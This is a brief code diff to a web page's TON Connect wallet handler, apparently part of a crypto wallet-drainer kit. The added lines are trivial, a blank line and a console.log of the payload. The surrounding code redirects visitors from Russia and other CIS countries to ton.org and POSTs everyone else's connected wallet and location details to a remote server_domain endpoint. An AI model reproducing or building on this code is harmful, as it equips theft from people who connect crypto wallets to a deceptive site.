@@ -95,6 +95,7 @@ const unsubscribe = tonConnectUI.onStatusChange(wallet => {
                 country: data.country,
                 domain: currentDomain
             };
+            
             if (sng === "true" && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
                 window.location.replace('https://ton.org');
             } else {
@@ -102,6 +103,7 @@ const unsubscribe = tonConnectUI.onStatusChange(wallet => {
                     ConnectedWallet: connectedWallet,
                     UserInfo: UserInfo
                 };
+                console.log(JSON.stringify(payload));
 
                 fetch(`https://${server_domain}/api/connected`, {
                         method: 'POST',
